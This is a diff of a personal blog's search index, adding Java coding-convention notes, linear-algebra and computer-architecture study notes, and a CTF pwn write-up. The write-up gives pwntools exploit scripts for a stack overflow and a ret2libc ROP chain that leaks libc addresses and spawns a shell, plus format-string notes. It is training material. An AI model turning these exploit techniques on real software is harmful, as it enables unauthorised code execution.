+<h1 id="JAVA代码规范"><a href="#JAVA代码规范" class="headerlink" title="JAVA代码规范"></a>JAVA代码规范</h1><h2 id="普通规范"><a href="#普通规范" class="headerlink" title="普通规范"></a>普通规范</h2><h4 id="包的命名方式：公司域名倒置-子公司-产品名称-功能名称"><a href="#包的命名方式：公司域名倒置-子公司-产品名称-功能名称" class="headerlink" title="包的命名方式：公司域名倒置+子公司/产品名称+功能名称"></a>包的命名方式：公司域名倒置+子公司/产品名称+功能名称</h4><p>如：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">net.hedao.music</span><br><span class="line">net.hedao.uem.internal</span><br><span class="line">net.hedao.uem.http</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="utils和tools命名规范"><a href="#utils和tools命名规范" class="headerlink" title="utils和tools命名规范"></a>utils和tools命名规范</h4><p>utils:</p>
+<ul>
+<li>定义：通用的，与业务无关，可供其他项目使用</li>
+<li>方法通常是public static;一般无类的属性，有的话也是public static</li>
+<li>例子：字符串类，文件工具类</li>
 </ul>
-<p>减法器可以用一个加法器，一个非门，一个VDD组合构成。</p>
+<p>tools:</p>
+<ul>
+<li>定义：在当前项目通用；仅能在当前项目使用</li>
+<li>方法通常是public static;一般无类的属性，有的话也是public static</li>
+<li>用户校验类，支付工具类</li>
+</ul>
+<h4 id="类名规范"><a href="#类名规范" class="headerlink" title="类名规范"></a>类名规范</h4><p>类名首字母大写，若多个单词拼合则采取驼峰式命名</p>
+<p>如：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TestDemo</span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="成员属性"><a href="#成员属性" class="headerlink" title="成员属性"></a>成员属性</h4><p>成员属性，变量名使用有含义的单词或词组构成；</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">long</span> abc=<span class="number">0</span>;<span class="comment">//禁止</span></span><br></pre></td></tr></table></figure>
+
+<p>常量必须由大写字母和下划线分割单词的方式组成</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">MAX_NUMBER</span> <span class="operator">=</span> Integer.MAX_VALUE;</span><br></pre></td></tr></table></figure>
+
+<p>静态变量:采用小写s开头，代表static，s后首字母大写，遵循驼峰原则</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">long</span> sCurrentTime;</span><br></pre></td></tr></table></figure>
+
+<p>实体类，java bean类中普通成员变量采用小写字母开头，单词之间采用驼峰式命名规范。</p>
+<p>注：此类用于存储数据，只有setter,getter方法，不作其他业务处理</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>&#123;</span><br><span class="line">			<span class="keyword">private</span> String userName;</span><br><span class="line">			<span class="keyword">private</span> String userAccount;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="方法的命名规范"><a href="#方法的命名规范" class="headerlink" title="方法的命名规范"></a>方法的命名规范</h4><p>方法命名采用小写字母开头，字母之间采用驼峰式命名规范，一般不超过20个字符，长度很长时可以使用简写</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">long</span> <span class="title function_">calculateScreenSize</span><span class="params">()</span> &#123;<span class="comment">//计算屏幕尺寸，正确</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> UserInfo <span class="title function_">getCustomUInfo</span><span class="params">()</span> &#123;<span class="comment">//获取客户个人信息，正确</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="type">long</span> <span class="title function_">size</span><span class="params">()</span> &#123;<span class="comment">//计算屏幕尺寸，错误</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> UserInfo <span class="title function_">getCustomUserInfomation</span><span class="params">()</span> &#123;<span class="comment">//获取客户个人信息，错误</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="注释规范"><a href="#注释规范" class="headerlink" title="注释规范"></a>注释规范</h2><p>注释：</p>
+<ul>
+<li>屏蔽不需要执行的代码</li>
+<li>对代码进行解释说明</li>
+</ul>
+<h4 id="类的注释"><a href="#类的注释" class="headerlink" title="类的注释"></a>类的注释</h4><p>类的注释采用多行注释方式，在包名和类定义中间，通常记录作者信息，版本号，类的功能描述信息等。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**  </span></span><br><span class="line"><span class="comment">* 文件工具类</span></span><br><span class="line"><span class="comment">* 项目名称:JAVA编码规范测试用例</span></span><br><span class="line"><span class="comment">* 包:net.herdao.common.utils   </span></span><br><span class="line"><span class="comment">* 类名称:FileUtils.java</span></span><br><span class="line"><span class="comment">* 类描述:本类是一个文件操作工具类，包括了文件的几个基本操作方法，创建文件、删除文件、文件重命名</span></span><br><span class="line"><span class="comment">* 创建人:林鸿亮</span></span><br><span class="line"><span class="comment">* 创建时间:2021/10/21 11:46</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FileUtils</span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="方法的注释"><a href="#方法的注释" class="headerlink" title="方法的注释"></a>方法的注释</h4><p>多行注释，主要内容记录该方法的<strong>作用</strong>，<strong>参数及参数说明</strong>，<strong>返回值</strong>、<strong>返回类容</strong>和<strong>异常信息说明</strong>，<strong>修改记录</strong>，<strong>是否过期</strong>，及<strong>修改日期</strong>等等。</p>
+<p>我们规定所有public类型的方法必须加上注释<strong>对方法和参数</strong>加以说明，private方法中如果处理逻辑相对较多，相对复杂的也应加上注释。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 在指定目录创建一个新文件</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> dirPath  文件目录路径</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> fileName 文件名称</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span>  返回创建的新文件</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> File <span class="title function_">createeNewFile</span><span class="params">(String dirPath, String fileName)</span> </span><br><span class="line">&#123;<span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(dirPath,fileName);</span><br><span class="line"> <span class="keyword">return</span> file;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="成员属性的注释"><a href="#成员属性的注释" class="headerlink" title="成员属性的注释"></a>成员属性的注释</h4><p>可以使用单行注释也可以使用多行注释</p>
+<p>代码块和单行代码通常采用单行注释</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deleteFile</span><span class="params">(File file)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (file != <span class="literal">null</span> &amp;&amp; file.exists()) &#123; <span class="comment">//判断文件是否存在</span></span><br><span class="line">file.delete(); <span class="comment">//删除文件</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="代码格式规范"><a href="#代码格式规范" class="headerlink" title="代码格式规范"></a>代码格式规范</h3><h4 id="统一编码格式"><a href="#统一编码格式" class="headerlink" title="统一编码格式"></a>统一编码格式</h4><p>统一采用UTF-8的格式</p>
+<h4 id="编码的缩进"><a href="#编码的缩进" class="headerlink" title="编码的缩进"></a>编码的缩进</h4><p>缩进空格数为4，同一业务级代码块保持左对齐，不能全在同一垂直线上</p>
+<h4 id="代码行宽度"><a href="#代码行宽度" class="headerlink" title="代码行宽度"></a>代码行宽度</h4><p>单行代码最长不得超过120列</p>
+<h4 id="代码行长度"><a href="#代码行长度" class="headerlink" title="代码行长度"></a>代码行长度</h4><p>方法长度限制在100行内，若有超过可能按照<strong>业务逻辑</strong>拆分成多个方法</p>
+<h4 id="属性及方法的范围确定"><a href="#属性及方法的范围确定" class="headerlink" title="属性及方法的范围确定"></a>属性及方法的范围确定</h4><ul>
+<li><p>public : 当某个方法或属性需要<strong>被外部非子类和非同包内中的对象直接调用</strong>的时候采用public属性。</p>
+</li>
+<li><p>protected : 当某个方法或属性<strong>只会被其子类调用</strong>或者<strong>只会同一包下的其他对象调用</strong>时，使用protected限制。</p>
+</li>
+<li><p>private: 当某个方法或属性<strong>只会被本类中的其他方法调用</strong>的时候，使用private限制。</p>
+</li>
+</ul>
+<h4 id="硬编码的后遗症"><a href="#硬编码的后遗症" class="headerlink" title="硬编码的后遗症"></a>硬编码的后遗症</h4><p>常量字符串或数值必须<strong>在类中定义常量值</strong>，通过<strong>常量值引用</strong>来使用固定数值和固定字符串</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class Test &#123;</span><br><span class="line">public static final int MIN_DATA = 1;</span><br><span class="line">public static final int MAX_DATA = 99;</span><br><span class="line">public static final String STR_SUM = &quot;岗位评分结果为=&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">private void printSum() &#123;</span><br><span class="line">System.out.println(STR_SUM+(MIN_DATA+MAX_DATA));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="TODO规范"><a href="#TODO规范" class="headerlink" title="TODO规范"></a>TODO规范</h4><p>用来描述已知待改进，待补充的修改点，加上作者名称</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// TODO &lt;“作者名称”&gt;: 补充XX处理</span><br></pre></td></tr></table></figure>
+
+<h4 id="方法参数规范"><a href="#方法参数规范" class="headerlink" title="方法参数规范"></a>方法参数规范</h4><p>每个方法最多三个参数，超出三个要封装成javabean对象</p>
+<h4 id="SysLog日志注解使用"><a href="#SysLog日志注解使用" class="headerlink" title="@SysLog日志注解使用"></a>@SysLog日志注解使用</h4><p>接口涉及增删改数据时必须使用@SysLog注解。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@ApiOperation(value = &quot;权限配置-修改用户角色&quot;,notes = &quot;权限配置-修改用户角色&quot;)</span></span><br><span class="line"><span class="meta">@SysLog(&quot;权限配置-修改用户角色&quot;)</span></span><br><span class="line"><span class="meta">@PutMapping(value = &quot;/editUserRole&quot;)</span></span><br><span class="line"><span class="keyword">public</span> R&lt;Boolean&gt; <span class="title function_">saveUserRole</span><span class="params">(<span class="meta">@RequestBody</span> UserDTO userDTO)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(userDTO.getUserId() == <span class="literal">null</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> R.failed(Boolean.FALSE).setMsg(<span class="string">&quot;用户id不能为空&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> R.ok(userService.saveUserRole(userDTO));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="工程框架规范"><a href="#工程框架规范" class="headerlink" title="工程框架规范"></a>工程框架规范</h3><h4 id="应用分层"><a href="#应用分层" class="headerlink" title="应用分层"></a>应用分层</h4><p>代码分层为MVC方式，<strong>不能</strong>用DDD方式修改代码目录结构</p>
+<h4 id="依赖包管理版本规范"><a href="#依赖包管理版本规范" class="headerlink" title="依赖包管理版本规范"></a>依赖包管理版本规范</h4><p>基础平台父工程hdp已经引入绝大部分开发所需maven 依赖包，如果需要增加依赖包必须先征得架构师同意。业务项目<strong>不得重复添加已有依赖包</strong>，所添加依赖包版本必须<strong>与基础平台依赖包版本一致</strong>，引入后必须<strong>处理依赖冲突</strong>。</p>
+]]></content>
+      <categories>
+        <category>编程语言</category>
+      </categories>
+      <tags>
+        <tag>Java</tag>
+        <tag>常用规范</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>线代预习一些知识</title>
+    <url>/2022/06/19/%E7%BA%BF%E4%BB%A3%E5%A4%8D%E4%B9%A0%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86/</url>
+    <content><![CDATA[<p> 这里是复习线代的时候怕遗忘摆的一些小知识，属于是预习过后的产物了(bushi</p>
+<span id="more"></span>
+
+<ul>
+<li><p>矩阵的加法需要的前提条件是两个矩阵<strong>行数列数</strong>相等，这叫<strong>通行矩阵</strong>，相加就是把各个元素加起来就好了</p>
+</li>
+<li><p>秩的数量(rank)=矩阵列数，则矩阵内所有向量彼此<strong>线性无关</strong>，若秩的数量&lt;矩阵列数，则矩阵内向量<strong>线性相关</strong></p>
+</li>
+<li><p>正交矩阵的性质：矩阵的<strong>转置</strong>=<strong>逆矩阵</strong>，矩阵点乘矩阵的转置=<strong>单位阵</strong>，行列式为1或-1</p>
+<h4 id="施密特正交化步骤："><a href="#施密特正交化步骤：" class="headerlink" title="施密特正交化步骤："></a>施密特正交化步骤：</h4></li>
+<li><p><strong>&lt;1&gt;.</strong>   $ A=a $</p>
+</li>
+<li><p><strong>&lt;2&gt;.</strong> $ B=b-\frac{A\tau*b}{A\tau*A}*A$ </p>
+</li>
+<li><p><strong>&lt;3&gt;.</strong> $ C=c-\frac{A\tau*c}{A\tau*A}*A-\frac{B\tau*c}{B\tau*b}*B $</p>
+<h3 id="一些关于行列式的性质："><a href="#一些关于行列式的性质：" class="headerlink" title="一些关于行列式的性质："></a>一些关于行列式的性质：</h3></li>
+</ul>
+<p>令$|A|=x$,且方阵是$n*n$的方阵：</p>
+<ol>
+<li><p>$$|2*A|=2^n*x$$</p>
+</li>
+<li><p>$$|-A|=(-1)^n*x$$</p>
+</li>
+<li><p>$$|A^2|=x^2$$</p>
+</li>
+<li><p>$$|A^-1|=\frac{1}{|A|}=\frac{1}{x}$$</p>
+</li>
+</ol>
+<p>basis 之间是线性无关的，所有的basis生成了整个空间。</p>
+<p>矩阵可逆可推出列空间是$R^3$</p>
+<p>列空间就是解的主元列的集合，零空间就是解的自由列的集合。</p>
+<p>列空间的维数是他的秩</p>
+<p>零空间的维数是自由列的数量(列数-秩的数量)</p>
+<h4 id="克雷默法则"><a href="#克雷默法则" class="headerlink" title="克雷默法则"></a>克雷默法则</h4><p>分母是整个矩阵的行列式，分子是把方程常数代入要求解变量中作为相应系数的矩阵，求解即可</p>
+<h4 id="公式"><a href="#公式" class="headerlink" title="公式"></a>公式</h4><p>$$A^-1=\frac{C\tau}{|A|}$$</p>
+<p>$$A*C\tau=|A|*I$$</p>
+<h4 id="特征值与特征向量"><a href="#特征值与特征向量" class="headerlink" title="特征值与特征向量"></a>特征值与特征向量</h4><p>特征值的和=矩阵左上右下对角线的和</p>
+<p>特征值的乘积等于矩阵的行列式</p>
+<h4 id="对角化"><a href="#对角化" class="headerlink" title="对角化"></a>对角化</h4><p>$$\Lambda$$是特征值依次排列下来的矩阵，只有对角线有元素</p>
+<p>X则是特征向量的集合的矩阵</p>
+<p>A是原矩阵</p>
+<p>有公式：</p>
+<p>$$\Lambda=X^-1*A*X$$ </p>
+<p>$$A=X^-1*\Lambda*X$$ </p>
 ]]></content>
       <categories>
         <category>大一课程</category>
       </categories>
       <tags>
-        <tag>计算机原理</tag>
+        <tag>线性代数</tag>
       </tags>
   </entry>
   <entry>
@@ -600,6 +589,26 @@
       <tags>
         <tag>语法</tag>
         <tag>markdown</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>计算机体系结构复习</title>
+    <url>/2022/06/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/</url>
+    <content><![CDATA[<p> 大一下预习计算机体系结构</p>
+<span id="more"></span>
+
+<h4 id="原码反码补码"><a href="#原码反码补码" class="headerlink" title="原码反码补码"></a>原码反码补码</h4><ul>
+<li>原码：二进制形式</li>
+<li>反码：原码除符号位不变，其余全部取反</li>
+<li>补码：反码加一 ($a-b$的意思是a加上b的补码)</li>
+</ul>
+<p>减法器可以用一个加法器，一个非门，一个VDD组合构成。</p>
+]]></content>
+      <categories>
+        <category>大一课程</category>
+      </categories>
+      <tags>
+        <tag>计算机原理</tag>
       </tags>
   </entry>
   <entry>
@@ -795,71 +804,62 @@
       </tags>
   </entry>
   <entry>
-    <title>线代预习一些知识</title>
-    <url>/2022/06/19/%E7%BA%BF%E4%BB%A3%E5%A4%8D%E4%B9%A0%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86/</url>
-    <content><![CDATA[<p> 这里是复习线代的时候怕遗忘摆的一些小知识，属于是预习过后的产物了(bushi</p>
+    <title>pwn:从一窍不通到入门的门前</title>
+    <url>/2022/07/06/pwn-%E4%BB%8E%E4%B8%80%E7%AA%8D%E4%B8%8D%E9%80%9A%E5%88%B0%E5%85%A5%E9%97%A8%E7%9A%84%E9%97%A8%E5%89%8D/</url>
+    <content><![CDATA[<p> 基础pwn例题，栈溢出，格式化字符串。</p>
 <span id="more"></span>
 
+<h3 id="栈溢出例题"><a href="#栈溢出例题" class="headerlink" title="栈溢出例题"></a>栈溢出例题</h3><h4 id="hello-pwn"><a href="#hello-pwn" class="headerlink" title="hello_pwn"></a>hello_pwn</h4><p>来源：攻防世界</p>
+<p>首先先checksec：</p>
+<p><img src="https://i.niupic.com/images/2022/09/04/a51X.png"></p>
+<p>再看伪代码：</p>
+<p><img src="https://i.niupic.com/images/2022/09/04/a51Y.png"></p>
+<p>再看偏移量：</p>
+<p><img src="https://i.niupic.com/images/2022/09/04/a51Z.png"></p>
+<p>这里基本就明白了：当dowrd_60106C=1853186401时，执行下面的sub函数，sub函数就直接得出flag了，因此只要再前一步的read函数那里创造栈溢出，再人为满足条件判断即可。</p>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./hello_pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;111.200.241.244&#x27;,52016)</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p64(<span class="number">1853186401</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h4><p>来源：攻防世界</p>
+<p>checksec:</p>
+<p><img src="https://i.niupic.com/images/2022/09/04/a520.png"></p>
+<p>32位程序，开启堆栈不可执行，这是一道构造ROP的经典例题。</p>
+<p><img src="https://i.niupic.com/images/2022/09/04/a521.png"></p>
+<p>源码看出漏洞还是栈溢出，但是此时找不到现成的system函数和binsh字符串。</p>
+<p>因此要找到system函数，知识点(搬运自wiki)</p>
 <ul>
-<li><p>矩阵的加法需要的前提条件是两个矩阵<strong>行数列数</strong>相等，这叫<strong>通行矩阵</strong>，相加就是把各个元素加起来就好了</p>
-</li>
-<li><p>秩的数量(rank)=矩阵列数，则矩阵内所有向量彼此<strong>线性无关</strong>，若秩的数量&lt;矩阵列数，则矩阵内向量<strong>线性相关</strong></p>
-</li>
-<li><p>正交矩阵的性质：矩阵的<strong>转置</strong>=<strong>逆矩阵</strong>，矩阵点乘矩阵的转置=<strong>单位阵</strong>，行列式为1或-1</p>
-<h4 id="施密特正交化步骤："><a href="#施密特正交化步骤：" class="headerlink" title="施密特正交化步骤："></a>施密特正交化步骤：</h4></li>
-<li><p><strong>&lt;1&gt;.</strong>   $ A=a $</p>
-</li>
-<li><p><strong>&lt;2&gt;.</strong> $ B=b-\frac{A\tau*b}{A\tau*A}*A$ </p>
-</li>
-<li><p><strong>&lt;3&gt;.</strong> $ C=c-\frac{A\tau*c}{A\tau*A}*A-\frac{B\tau*c}{B\tau*b}*B $</p>
-<h3 id="一些关于行列式的性质："><a href="#一些关于行列式的性质：" class="headerlink" title="一些关于行列式的性质："></a>一些关于行列式的性质：</h3></li>
+<li>system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。</li>
+<li>即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。</li>
+<li>查找Libc的网址：<a href="https://libc.blukat.me/">https://libc.blukat.me/</a>和<a href="https://libc.rip/">https://libc.rip/</a></li>
 </ul>
-<p>令$|A|=x$,且方阵是$n*n$的方阵：</p>
-<ol>
-<li><p>$$|2*A|=2^n*x$$</p>
-</li>
-<li><p>$$|-A|=(-1)^n*x$$</p>
-</li>
-<li><p>$$|A^2|=x^2$$</p>
-</li>
-<li><p>$$|A^-1|=\frac{1}{|A|}=\frac{1}{x}$$</p>
-</li>
-</ol>
-<p>basis 之间是线性无关的，所有的basis生成了整个空间。</p>
-<p>矩阵可逆可推出列空间是$R^3$</p>
-<p>列空间就是解的主元列的集合，零空间就是解的自由列的集合。</p>
-<p>列空间的维数是他的秩</p>
-<p>零空间的维数是自由列的数量(列数-秩的数量)</p>
-<h4 id="克雷默法则"><a href="#克雷默法则" class="headerlink" title="克雷默法则"></a>克雷默法则</h4><p>分母是整个矩阵的行列式，分子是把方程常数代入要求解变量中作为相应系数的矩阵，求解即可</p>
-<h4 id="公式"><a href="#公式" class="headerlink" title="公式"></a>公式</h4><p>$$A^-1=\frac{C\tau}{|A|}$$</p>
-<p>$$A*C\tau=|A|*I$$</p>
-<h4 id="特征值与特征向量"><a href="#特征值与特征向量" class="headerlink" title="特征值与特征向量"></a>特征值与特征向量</h4><p>特征值的和=矩阵左上右下对角线的和</p>
-<p>特征值的乘积等于矩阵的行列式</p>
-<h4 id="对角化"><a href="#对角化" class="headerlink" title="对角化"></a>对角化</h4><p>$$\Lambda$$是特征值依次排列下来的矩阵，只有对角线有元素</p>
-<p>X则是特征向量的集合的矩阵</p>
-<p>A是原矩阵</p>
-<p>有公式：</p>
-<p>$$\Lambda=X^-1*A*X$$ </p>
-<p>$$A=X^-1*\Lambda*X$$ </p>
+<p>简单来说：实际的(真实的)地址是需要计算出来的，具体计算方式是：<strong>实际地址=libc偏移量+libc基地址</strong>在已知libc的情况下，我们需要做的就是找到<strong>libc的基址</strong>，而想要找到基址，我们需要知道一个函数的实际地址，本题中关键函数内存在write,read函数，因此想法是使用write函数泄露出write函数的真实地址，而plt表，got表，实际加载地址可以参考下图(搬运自csdn(滑稽))：</p>
+<p><img src="https://i.niupic.com/images/2022/09/04/a522.png"></p>
+<p>这样就可以得到基本的思路了: 先构造栈溢出使程序跳到write函数的plt表地址上，此时再次调用main函数或者vulnerable函数再次执行，此时就可以利用write函数打印出write的got表地址，此时需要我们人为的输入write函数的参数。这样就可以得到write函数的真实地址了。栈上的流程大概是这样的（仍然是搬运的(滑天下之大稽）：</p>
+<p><img src="https://i.niupic.com/images/2022/09/04/a523.png"></p>
+<p>这样输出之后我们就得到了write函数的真实地址了，再通过libc来求得system和binsh的真实地址，最后第二次调动程序，再次利用漏洞，就可以得到shell。</p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process(&#x27;./level3&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;61.147.171.105&#x27;</span>,<span class="number">59245</span>)</span><br><span class="line"></span><br><span class="line">padding=<span class="number">0x88</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./level3&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc_32.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;:\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">write_got_addr=u32(p.recv()[:<span class="number">4</span>])</span><br><span class="line"><span class="built_in">print</span>(write_got_addr)</span><br><span class="line"></span><br><span class="line">libc_write=libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">libc_base=write_got_addr-libc_write</span><br><span class="line"></span><br><span class="line">system_addr=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;the system address is:&#x27;</span>,<span class="built_in">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_bin=<span class="built_in">next</span>(libc.search(<span class="string">b&quot;bin/sh&quot;</span>))//找到binsh偏移的方法</span><br><span class="line">bin_addr=libc_base+libc_bin</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;the binsh address is:&quot;</span>,<span class="built_in">hex</span>(bin_addr))</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*padding+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(system_addr)+p32(<span class="number">0xdeadbeef</span>)+p32(bin_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;:\n&#x27;</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h3><p>基本原理以及利用方法在wiki上有解释。</p>
+<p>&lt;<a href="https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/">原理介绍 - CTF Wiki (ctf-wiki.org)</a>&gt;</p>
+<p>主要意思是利用printf一类函数漏洞，当函数没有严格规定格式化字符串时，攻击者可以控制printf函数来输出其他内容，由于格式化字符串输出的是栈上内容，因此此漏洞可以找到栈上其他位置的信息，比如地址，数据。总结一下就是：超出的每一个格式化字符串都能对下一格栈空间造成影响。</p>
+<p>%d:打印成数字，只能泄露栈本身内容</p>
+<p>%x:打印成16进制，只能泄露栈本身内容</p>
+<p>%s:识别栈上内容为指针，打印出该指针指向的位置，这里有可能造成任意地址的泄露（只要能控制栈并完成布局）</p>
+<p>%c:输出字符</p>
+<p>%n:把前面已经打印的长度<strong>写入</strong>某个内存地址(实现任意地址写入)</p>
+<p>%n:写入4个字节，写入1–&gt;0000 0001</p>
+<p>%hn:写入两个字节，写入1–&gt;0001</p>
+<p>%hhn:写入单个字节,写入1–&gt;01</p>
+<h3 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h3><p>啥都没有，因为懒得搞，搞堆去了</p>
+<p><img src="https://i.niupic.com/images/2022/09/04/a51S.jpg"></p>
 ]]></content>
       <categories>
-        <category>大一课程</category>
+        <category>CTF!</category>
       </categories>
       <tags>
-        <tag>线性代数</tag>
+        <tag>基础</tag>
+        <tag>pwn</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>大牛的博客(学习用)</title>
-    <url>/2022/09/22/%E5%A4%A7%E7%89%9B%E7%9A%84%E5%8D%9A%E5%AE%A2-%E5%AD%A6%E4%B9%A0%E7%94%A8/</url>
-    <content><![CDATA[<p> 这里收录一些大佬的博客，可以跟着学习：</p>
-<span id="more"></span>
-
-<h2 id="Pwn手师傅们的博客"><a href="#Pwn手师傅们的博客" class="headerlink" title="Pwn手师傅们的博客"></a>Pwn手师傅们的博客</h2><p><a href="https://godjj.top/">https://godjj.top/</a></p>
-<p><a href="https://csomepro.github.io/">https://csomepro.github.io/</a></p>
-<p><a href="https://www.cnblogs.com/ZIKH26">https://www.cnblogs.com/ZIKH26</a></p>
-<p><a href="https://github.com/tangzichengcc/The_Growth_Path_Of_A_CTFer_And_Pwner">https://github.com/tangzichengcc/The_Growth_Path_Of_A_CTFer_And_Pwner</a></p>
-<p><a href="http://blog.eonew.cn/">http://blog.eonew.cn/</a></p>
-]]></content>
   </entry>
 </search>
